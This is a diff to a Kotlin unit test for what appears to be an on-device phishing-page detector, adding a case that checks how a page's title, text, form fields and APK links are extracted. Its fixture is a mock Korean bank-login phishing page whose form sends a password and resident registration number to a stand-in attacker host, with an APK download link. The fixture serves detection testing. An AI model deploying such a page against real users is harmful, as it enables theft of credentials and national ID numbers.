@@ -5,8 +5,10 @@ import com.guadian.ondevice.judge.ReasonCode
 import com.guadian.ondevice.judge.Risk
 import com.guadian.ondevice.judge.RiskCategory
 import com.guadian.ondevice.judge.Verdict
+import com.guadian.ondevice.llm.PageObservation
 import kotlinx.coroutines.runBlocking
 import org.junit.Assert.assertEquals
+import org.junit.Assert.assertTrue
 import org.junit.Test
 import java.net.URLEncoder
 
@@ -63,13 +65,37 @@ class PageContentJudgeTest {
         assertEquals(ReasonCode.PAGE_UNSUPPORTED_SCHEME, verdict.reason)
     }
 
-    private fun judgeHtml(html: String): Verdict {
+    @Test
+    fun observesPageTheWayTheCollectorDid() {
+        var observation: PageObservation? = null
+        judgeHtml(
+            "<html><head><title> Bank  Login </title><style>.x{}</style></head><body>" +
+                "<p>본인 인증이</p><p>필요합니다</p><script>var hidden = 1;</script>" +
+                "<form action=\"https://collect.attacker.net/p\"><input type=\"password\" name=\"pw\">" +
+                "<input name=\"jumin\" placeholder=\"주민등록번호\"></form>" +
+                "<a href=\"https://files.example.net/app.apk\">download</a></body></html>",
+        ) { observation = it }
+
+        val obs = checkNotNull(observation)
+        assertTrue(obs.loaded)
+        assertEquals("Bank  Login", obs.title)
+        // Text nodes joined with spaces and collapsed; script and style text excluded.
+        assertEquals("Bank Login 본인 인증이 필요합니다 download", obs.text)
+        assertEquals(listOf("password", "rrn"), obs.forms.single().asks)
+        assertEquals(listOf("https://files.example.net/app.apk"), obs.apkLinks)
+    }
+
+    private fun judgeHtml(html: String, onObservation: (PageObservation) -> Unit = {}): Verdict {
         // URLEncoder is form-encoding (space -> "+"), not URI percent-encoding;
         // a literal "+" between e.g. "input" and "type=..." would corrupt the
         // tag itself, so space must become "%20" instead.
         val encoded = URLEncoder.encode(html, "UTF-8").replace("+", "%20")
         val dataUrl = "data:text/html;charset=utf-8,$encoded"
-        val judge = PageContentJudge(context = context, allowedSchemes = setOf("data"))
+        val judge = PageContentJudge(
+            context = context,
+            allowedSchemes = setOf("data"),
+            onObservation = { _, obs -> onObservation(obs) },
+        )
         return runBlocking { judge.judge(dataUrl) }
     }
 }
